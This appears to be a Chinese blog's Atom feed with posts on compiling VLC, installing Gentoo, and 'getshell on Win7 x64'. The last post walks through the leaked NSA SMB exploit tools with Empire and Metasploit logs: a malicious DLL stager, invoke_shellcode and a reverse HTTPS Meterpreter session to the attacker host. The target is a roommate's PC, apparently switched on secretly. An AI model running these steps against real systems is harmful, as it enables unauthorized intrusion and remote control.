class="line"></span><br><span class="line">[root@localhost mm_addr]# </span><br><span class="line"></span><br></pre></td></tr></table></figure><br>成功通过段页式翻译找到tmp对应的值为0x12345678deadbeef.</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过实验加深理解,如有时间可再深入研究物理地址映射的实现.</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt; 主要根据&lt;a href=&quot;http://www.ilinuxkernel.com/&quot;&gt;www.ilinuxkernel.com&lt;/a&gt;站点上的同名pdf文档做实验分析&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="study" scheme="https://embpgp.github.io/categories/study/"/>
    
    
      <category term="Linux kernel" scheme="https://embpgp.github.io/tags/Linux-kernel/"/>
    
      <category term="LDD" scheme="https://embpgp.github.io/tags/LDD/"/>
    
  </entry>
  
  <entry>
    <title>compile VLC for Linux</title>
    <link href="https://embpgp.github.io/2017/08/25/compile-VLC-for-Linux/"/>
    <id>https://embpgp.github.io/2017/08/25/compile-VLC-for-Linux/</id>
    <published>2017-08-25T13:26:42.000Z</published>
    <updated>2025-03-11T12:14:38.966Z</updated>
    
    <content type="html"><![CDATA[<p>参考资料：<br>依赖项：<a href="http://www.cnblogs.com/oloroso/p/4595136.html">http://www.cnblogs.com/oloroso/p/4595136.html</a><br>Aclocal版本重新校正：<a href="https://github.com/threatstack/libmagic/issues/3">https://github.com/threatstack/libmagic/issues/3</a><br>临时卸载QT5：<a href="https://forum.videolan.org/viewtopic.php?t=124188&start=20">https://forum.videolan.org/viewtopic.php?t=124188&amp;start=20</a></p><span id="more"></span><hr><h1 id="源码下载"><a href="#源码下载" class="headerlink" title="源码下载"></a>源码下载</h1><ul><li><p>在<a href="https://www.videolan.org/vlc/download-sources.html">官网</a>或者<a href="https://github.com/videolan/vlc">Github仓库</a>将源码下载到本地。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pgp@r00t:~/github/vlc-2.2.6$ ls </span><br><span class="line">ABOUT-NLS   autotools  ChangeLog    configure     COPYING      extras   lib         Makefile.am  NEWS    share  THANKS</span><br><span class="line">aclocal.m4  bin        compat       configure.ac  COPYING.LIB  include  m4          Makefile.in  po      src</span><br><span class="line">AUTHORS     bootstrap  config.h.in  contrib       doc          INSTALL  make-alias  modules      README  <span class="built_in">test</span></span><br><span class="line">pgp@r00t:~/github/vlc-2.2.6$</span><br></pre></td></tr></table></figure></li><li><p>首先查看源码的INSTALL文件了解如何编译源码，如果没有configure文件则需要先运行bootstrap脚本来生成它。</p></li></ul><h1 id="编译源码"><a href="#编译源码" class="headerlink" title="编译源码"></a>编译源码</h1><ul><li><p>之后运行<code>./configure</code>即可配置，此过程可能会遇到很多检查不通过，而且会不断地运行该命令来检查是否配置正确。因此先参考<a href="http://www.cnblogs.com/oloroso/p/4595136.html">链接</a>来解决一些依赖性问题。对于ubuntu可在终端直接键入<code>sudo apt-get build-dep vlc</code>。</p></li><li><p>对于问题“configure: error: “You cannot build VLC with Qt-5.5.0. You need to backport I78ef29975181ee22429c9bd4b11d96d9e68b7a9c””<a href="https://forum.videolan.org/viewtopic.php?t=124188&start=20">网络上</a>给出的解决方案是暂时移除Qt5相关库，在编译通过后以后若需要则再安装回来即可。键入<code>sudo apt remove qt5-default qt5-qmake qtbase5-dev qtbase5-dev-tools libqt5opengl5-dev libqt5x11extras5-dev </code>,之后继续<code>./configure</code>。当遇到如下提示则表明可进行编译了。</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">libvlc configuration</span><br><span class="line">--------------------</span><br><span class="line">version               : 2.2.6</span><br><span class="line">system                : linux</span><br><span class="line">architecture          : x86_64 mmx sse sse2</span><br><span class="line">optimizations         : yes</span><br><span class="line">vlc aliases           : cvlc rvlc nvlc</span><br><span class="line"></span><br><span class="line">To build vlc and its plugins, <span class="built_in">type</span> `make<span class="string">&#x27;, or `./compile&#x27;</span> <span class="keyword">if</span> you like nice colors.</span><br></pre></td></tr></table></figure><ul><li>编译完成</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pgp@r00t:~/github/vlc-2.2.6$ ls </span><br><span class="line">ABOUT-NLS   bin        compile      config.status  COPYING      doltcompile  INSTALL  make-alias   modules  README  stamp-h1</span><br><span class="line">aclocal.m4  bootstrap  config.h     configure      COPYING.LIB  doltlibtool  lib      Makefile     NEWS     rvlc    <span class="built_in">test</span></span><br><span class="line">AUTHORS     ChangeLog  config.h.in  configure.ac   cvlc         extras       libtool  Makefile.am  nvlc     share   THANKS</span><br><span class="line">autotools   compat     config.log   contrib        doc          include      m4       Makefile.in  po       src     vlc</span><br><span class="line">pgp@r00t:~/github/vlc-2.2.6$ ./vlc --version</span><br><span class="line">VLC media player 2.2.6 Umbrella (revision 2.2.6-0-g1aae78981c)</span><br><span class="line">VLC version 2.2.6 Umbrella (2.2.6-0-g1aae78981c)</span><br><span class="line">Compiled by pgp on r00t (Aug 28 2017 10:47:37)</span><br><span class="line">Compiler: gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4)</span><br><span class="line">This program comes with NO WARRANTY, to the extent permitted by law.</span><br><span class="line">You may redistribute it under the terms of the GNU General Public License;</span><br><span class="line">see the file named COPYING <span class="keyword">for</span> details.</span><br><span class="line">Written by the VideoLAN team; see the AUTHORS file.</span><br><span class="line">pgp@r00t:~/github/vlc-2.2.6$</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>搭建VLC编译环境的主要目的还是为了学习一下其内部某些库对于音视频流标准的解析和构建算法。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;参考资料：&lt;br&gt;依赖项：&lt;a href=&quot;http://www.cnblogs.com/oloroso/p/4595136.html&quot;&gt;http://www.cnblogs.com/oloroso/p/4595136.html&lt;/a&gt;&lt;br&gt;Aclocal版本重新校正：&lt;a href=&quot;https://github.com/threatstack/libmagic/issues/3&quot;&gt;https://github.com/threatstack/libmagic/issues/3&lt;/a&gt;&lt;br&gt;临时卸载QT5：&lt;a href=&quot;https://forum.videolan.org/viewtopic.php?t=124188&amp;start=20&quot;&gt;https://forum.videolan.org/viewtopic.php?t=124188&amp;amp;start=20&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="study" scheme="https://embpgp.github.io/categories/study/"/>
    
    
      <category term="Linux" scheme="https://embpgp.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>gentoo_install</title>
    <link href="https://embpgp.github.io/2017/08/04/gentoo-install/"/>
    <id>https://embpgp.github.io/2017/08/04/gentoo-install/</id>
    <published>2017-08-04T11:09:31.000Z</published>
    <updated>2025-03-11T12:14:38.966Z</updated>
    
    <content type="html"><![CDATA[<p>参考资料:<br><a href="https://wiki.gentoo.org/wiki/Handbook:AMD64/zh-cn">https://wiki.gentoo.org/wiki/Handbook:AMD64/zh-cn</a>等等搜索引擎能够解决的问题链接</p><blockquote><p>今年三月份的时候就着手准备，无奈时间一直不连续，到近期下决心装好桌面版本，遂今日成．</p></blockquote><span id="more"></span><hr><h1 id="gentoo是啥？"><a href="#gentoo是啥？" class="headerlink" title="gentoo是啥？"></a>gentoo是啥？</h1><p>  跟Arch差不多的可供闲着的人折腾的定制化版的GNU/Linux．滚动更新和源码安装等是其和其他普遍的发行版最大的区别．成功安装gentoo，最起码使得初学者对GNU/Linux操作系统的大体构成有一定了解．</p><h1 id="安装环境"><a href="#安装环境" class="headerlink" title="安装环境"></a>安装环境</h1><p>  我个人的情况是已经安装了个GNU/Linux了且boot选项移交给了其gurb管理器，同时我是安装在物理机上的，因此后续的安装bootloader部分我就可以跳过了．简单点说就是在rootfs没有问题的情况下只要把内核源码编译出来的镜像放在指定位置同时新增前者的grub内容选项即可．我为rootfs分配了大概35G的磁盘空间，为boot分配了100M,而swap可以借用前者的，由于没有为/usr和/home分区因此其内容均挂载在rootfs下，其影响就是容灾性降低了．具体分区可用fdisk等分区工具．</p><h1 id="下载镜像"><a href="#下载镜像" class="headerlink" title="下载镜像"></a>下载镜像</h1><p>  网络上建议下载minimal版本的，其跟live主要区别就是全部都是黑框框．而后下载stage3和portage.可以在<a href="http://mirrors.163.com/gentoo/releases/">这里</a>下载.portage得下载最新版的，便于后期处理．而后可以用dd或者其他烧录工具将iso镜像烧录到u盘中，将其他两个文件包直接放在rootfs里面即可(portage包是在stage3解压之后再解压到/usr目录)．</p><h1 id="配置gentoo"><a href="#配置gentoo" class="headerlink" title="配置gentoo"></a>配置gentoo</h1><p>根据wiki里面的handbook先配置好大部分，其中需要主要的是网卡驱动部分．现在shell里面键入<code>lspci -k</code>即可，如下所示:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">01:00.0 Ethernet controller: Realtek Semiconductor Co., Ltd. RTL8101/2/6E PCI Express Fast/Gigabit Ethernet controller (rev 05)</span><br><span class="line">Subsystem: Dell RTL8101/2/6E PCI Express Fast/Gigabit Ethernet controller</span><br><span class="line">Kernel driver <span class="keyword">in</span> use: r8169</span><br><span class="line">Kernel modules: r8169</span><br><span class="line">02:00.0 Network controller: Broadcom Corporation BCM43142 802.11b/g/n (rev 01)</span><br><span class="line">Subsystem: Dell Wireless 1704 802.11n + BT 4.0</span><br><span class="line">Kernel driver <span class="keyword">in</span> use: wl</span><br><span class="line">Kernel modules: bcma, wl</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>根据下面的提示可以找到相应的网卡驱动，在<code>make menuconfig</code>之后直接键入<code>/</code>进行模块的搜索，例如<code>r8169</code>而后选中后即可将内核模块编译进来，同时需要注意网卡命名是否类似于<code>eth0</code>，如果不是则需要在网络配置的时候更改，例如<code>enp1s0</code>建立软链接，这样网络才能起来．其他部分也可以先让系统起来之后再去重新编译内核再加．如果没有挂载boot分区则需要手动将压缩后的内核镜像和符号表等复制到boot分区．我的grub.cfg新增的内容如下:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">menuentry <span class="string">&#x27;Gentoo/Linux 4.9.34&#x27;</span>&#123;</span><br><span class="line">insmod ext2</span><br><span class="line"><span class="built_in">set</span> root=<span class="string">&#x27;hd0,msdos10&#x27;</span></span><br><span class="line">linux /vmlinuz-4.9.34-gentoo root=/dev/sda16</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中<code>set root=</code>部分是boot所在的分区，我这里是sda10.<code>linux ...</code>里面的vmlinuz-4.9.34-gentoo是内核镜像名称，其文件就在sda10分区．而root=后面的内容则是rootfs所在分区．而后exit处chroot环境，reboot准备进入物理环境了．</p><h1 id="装桌面"><a href="#装桌面" class="headerlink" title="装桌面"></a>装桌面</h1><p>先不着急在eselect里面选择，首先利用网络先<code>emerge --sync</code>同步portage树，而后可以选择安装一些需要的软件例如vim等．之前一直卡在这里，解决不了依赖性问题，首先搜索到了xorg的安装方式，参考<a href="https://wiki.gentoo.org/wiki/Xorg/Guide/zh-cn">这里</a>将显卡的驱动安装好，之后便可操作eselect选项，可先做轻便的desktop的选项，而后搜索到xfce4的安装方法，照葫芦画瓢的我便从昨天装到今天中午终于完工了．之后的APP的安装应该都不是什么大问题，装上chrome几乎能够解决很多需求问题．<br><img src="/images/gentoo_desktop.png" alt="gentoo_desktop.png"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>换个酷炫点的桌面还是继续折腾BLFS…</p><h2 id="issue"><a href="#issue" class="headerlink" title="issue"></a>issue</h2><ul><li>提示<code>The emerge option --autounmask-write writes autounmask features into the corresponding config files.</code>，重复上次的命令加上参数，然后使用自带的<code>dispatch-conf</code>命令自动写入配置，而后再执行最开始的命令即可解决软件安装版本以及依赖性问题．</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;参考资料:&lt;br&gt;&lt;a href=&quot;https://wiki.gentoo.org/wiki/Handbook:AMD64/zh-cn&quot;&gt;https://wiki.gentoo.org/wiki/Handbook:AMD64/zh-cn&lt;/a&gt;等等搜索引擎能够解决的问题链接&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;今年三月份的时候就着手准备，无奈时间一直不连续，到近期下决心装好桌面版本，遂今日成．&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="study" scheme="https://embpgp.github.io/categories/study/"/>
    
    
      <category term="GNU/Linux" scheme="https://embpgp.github.io/tags/GNU-Linux/"/>
    
      <category term="gentoo" scheme="https://embpgp.github.io/tags/gentoo/"/>
    
  </entry>
  
  <entry>
    <title>getshell on Win7 x64</title>
    <link href="https://embpgp.github.io/2017/04/27/getshell-on-Win7-x64/"/>
    <id>https://embpgp.github.io/2017/04/27/getshell-on-Win7-x64/</id>
    <published>2017-04-27T03:49:14.000Z</published>
    <updated>2025-03-11T12:14:38.966Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>凌晨亲自测试NSA Tools，感叹MS08-067时代复现．</p></blockquote><span id="more"></span><hr><p>参考链接:<br><a href="https://www.exploit-db.com/docs/41896.pdf">https://www.exploit-db.com/docs/41896.pdf</a><br><a href="https://www.youtube.com/watch?v=OBP_kH6EYmk">https://www.youtube.com/watch?v=OBP_kH6EYmk</a></p><hr><h1 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h1><p>由于近期shadowbroker一直抢占安全头条，随着NSA泄露的工具被解密在github上面，我也想感受一下这些工具的威力，便找了些教程来测试一番．其实完全可以按照第一个链接的PDF文档来搭建环境，文章中说到Win7和Win2K8通过SMB漏洞不需要验证直接可以利用．</p><p>target:Win 7 x64 192.168.31.252<br>attacker_1:WinXP 192.168.31.52<br>attacker_2:Ubuntu 16.04 192.168.31.30</p><p>没错，我用的就是小米路由器(31网段),ubuntu无线连接并开启XP虚拟机桥接到物理机使其分配到同网段IP，将室友的Win7悄悄地开机并默认连接到路由器即可开始．按照教程还必须安装py2.6和pywin32v2.12在XP攻击机上，ubuntu上安装Empire和MSF用来生成恶意dll和反弹shell．</p><h1 id="跑起来"><a href="#跑起来" class="headerlink" title="跑起来"></a>跑起来</h1><p>教程良心，可直接根据提示跑起来，以下为截图或shell echo.</p><h2 id="改fb-py"><a href="#改fb-py" class="headerlink" title="改fb.py"></a>改fb.py</h2><p>从github上down源码下来改几处代码即可<br><img src="/images/fb.png" alt="fb.png"></p><h2 id="跑Empire"><a href="#跑Empire" class="headerlink" title="跑Empire"></a>跑Empire</h2><p>从github上down源码install.sh即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">====================================================================================</span><br><span class="line"> Empire: PowerShell post-exploitation agent | [Version]: 1.6.0</span><br><span class="line">====================================================================================</span><br><span class="line"> [Web]: https://www.PowerShellEmpire.com/ | [Twitter]: @harmj0y, @sixdub, @enigma0x3</span><br><span class="line">====================================================================================</span><br><span class="line"></span><br><span class="line">   _______ .___  ___. .______    __  .______       _______</span><br><span class="line">  |   ____||   \/   | |   _  \  |  | |   _  \     |   ____|</span><br><span class="line">  |  |__   |  \  /  | |  |_)  | |  | |  |_)  |    |  |__</span><br><span class="line">  |   __|  |  |\/|  | |   ___/  |  | |      /     |   __|</span><br><span class="line">  |  |____ |  |  |  | |  |      |  | |  |\  \----.|  |____</span><br><span class="line">  |_______||__|  |__| | _|      |__| | _| `._____||_______|</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       181 modules currently loaded</span><br><span class="line"></span><br><span class="line">       0 listeners currently active</span><br><span class="line"></span><br><span class="line">       0 agents currently active</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(Empire) &gt; <span class="built_in">set</span> Name Eternal</span><br><span class="line">[!] Please choose <span class="string">&#x27;ip_whitelist&#x27;</span> or <span class="string">&#x27;ip_blacklist&#x27;</span></span><br><span class="line">(Empire) &gt; list</span><br><span class="line">list       listeners  </span><br><span class="line">(Empire) &gt; listeners</span><br><span class="line">[!] No listeners currently active </span><br><span class="line">(Empire: listeners) &gt; <span class="built_in">set</span> Name Eternal</span><br><span class="line">(Empire: listeners) &gt; <span class="built_in">set</span> Host http://192.168.31.30</span><br><span class="line">(Empire: listeners) &gt; <span class="built_in">set</span> Port 8080</span><br><span class="line">(Empire: listeners) &gt; execute</span><br><span class="line">[!] Error starting listener on port 8080: [Errno 98] Address already <span class="keyword">in</span> use</span><br><span class="line">[!] Error starting listener on port 8080, port likely already <span class="keyword">in</span> use.</span><br><span class="line">(Empire: listeners) &gt; <span class="built_in">set</span> Port 8000</span><br><span class="line">(Empire: listeners) &gt; execute</span><br><span class="line">[*] Listener <span class="string">&#x27;Eternal&#x27;</span> successfully started.</span><br><span class="line">(Empire: listeners) &gt; list</span><br><span class="line"></span><br><span class="line">[*] Active listeners:</span><br><span class="line"></span><br><span class="line">  ID    Name              Host                                 Type      Delay/Jitter   KillDate    Redirect Target</span><br><span class="line">  --    ----              ----                                 -------   ------------   --------    ---------------</span><br><span class="line">  1     Eternal           http://192.168.31.30:8000            native    5/0.0                      </span><br><span class="line"></span><br><span class="line">(Empire: listeners) &gt; usestager dll Eternal</span><br><span class="line">(Empire: stager/dll) &gt; <span class="built_in">set</span> Arch x64</span><br><span class="line">(Empire: stager/dll) &gt; execute</span><br><span class="line"></span><br><span class="line">[*] Stager output written out to: /tmp/launcher.dll</span><br><span class="line"></span><br><span class="line">(Empire: stager/dll) &gt; [+] Initial agent RDZ4SYWEFTKBF3FD from 192.168.31.252 now active</span><br><span class="line"></span><br><span class="line">(Empire: stager/dll) &gt; agents</span><br><span class="line"></span><br><span class="line">[*] Active agents:</span><br><span class="line"></span><br><span class="line">  Name               Internal IP     Machine Name    Username            Process             Delay    Last Seen</span><br><span class="line">  ---------          -----------     ------------    ---------           -------             -----    --------------------</span><br><span class="line">  RDZ4SYWEFTKBF3FD   192.168.31.252  USER-20170312IA *WorkGroup\SYSTEM   lsass/792           5/0.0    2017-04-27 02:09:35</span><br><span class="line"></span><br><span class="line">(Empire: agents) &gt; sysinfo</span><br><span class="line">*** Unknown syntax: sysinfo</span><br><span class="line">(Empire: agents) &gt; interact RDZ4SYWEFTKBF3FD</span><br><span class="line">(Empire: RDZ4SYWEFTKBF3FD) &gt; systeminfo</span><br><span class="line">[!] Command not recognized.</span><br><span class="line">[*] Use <span class="string">&#x27;help&#x27;</span> or <span class="string">&#x27;help agentcmds&#x27;</span> to see available commands.</span><br><span class="line">(Empire: RDZ4SYWEFTKBF3FD) &gt; sysinfo</span><br><span class="line">(Empire: RDZ4SYWEFTKBF3FD) &gt; </span><br><span class="line">Description      : Qualcomm Atheros AR9485WB-EG Wireless Network Adapter</span><br><span class="line">MACAddress       : XX:XX:XX:XX:XX:XX</span><br><span class="line">DHCPEnabled      : True</span><br><span class="line">IPAddress        : 192.168.31.252,fe80::5d70:a440:294c:b455</span><br><span class="line">IPSubnet         : 255.255.255.0,64</span><br><span class="line">DefaultIPGateway : 192.168.31.1</span><br><span class="line">DNSServer        : 192.168.31.1</span><br><span class="line">DNSHostName      : USER-20170312IA</span><br><span class="line">DNSSuffix        :</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(Empire: RDZ4SYWEFTKBF3FD) &gt; usemodule code_execution/invoke_shellcode</span><br><span class="line">(Empire: code_execution/invoke_shellcode) &gt; <span class="built_in">set</span> Lhost 192.168.31.30</span><br><span class="line">(Empire: code_execution/invoke_shellcode) &gt; <span class="built_in">set</span> Lport 9999</span><br><span class="line">(Empire: code_execution/invoke_shellcode) &gt; execute</span><br><span class="line">(Empire: code_execution/invoke_shellcode) &gt; </span><br><span class="line">Job started: Debug32_gnns4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="跑msf"><a href="#跑msf" class="headerlink" title="跑msf"></a>跑msf</h2><p>跑Kali或者Debian系GNU/Linux都可，安装msf跑起来接收反弹shell，主要用meterpreter．</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler </span><br><span class="line">msf exploit(handler) &gt; </span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_h</span><br><span class="line"><span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_hop_http</span><br><span class="line"><span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_http</span><br><span class="line"><span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_http_proxy_pstore</span><br><span class="line"><span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_https</span><br><span class="line"><span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_https_proxy</span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_https</span><br><span class="line">PAYLOAD =&gt; windows/meterpreter/reverse_https</span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> LHOST 192.168.31.30</span><br><span class="line">LHOST =&gt; 192.168.31.30</span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> LPORT 9999</span><br><span class="line">LPORT =&gt; 9999</span><br><span class="line">msf exploit(handler) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started HTTPS reverse handler on https://192.168.31.30:9999</span><br><span class="line">[*] Starting the payload handler...</span><br><span class="line">[*] https://192.168.31.30:9999 handling request from 192.168.31.252; (UUID: 7pzlvccd) Staging Native payload...</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.31.30:9999 -&gt; 192.168.31.252:49714) at 2017-04-27 02:20:13 +0800</span><br><span class="line"></span><br><span class="line">meterpreter &gt; sysinfo </span><br><span class="line">Computer        : USER-20170312IA</span><br><span class="line">OS              : Windows 7 (Build 7601, Service Pack 1).</span><br><span class="line">Architecture    : x64 (Current Process is 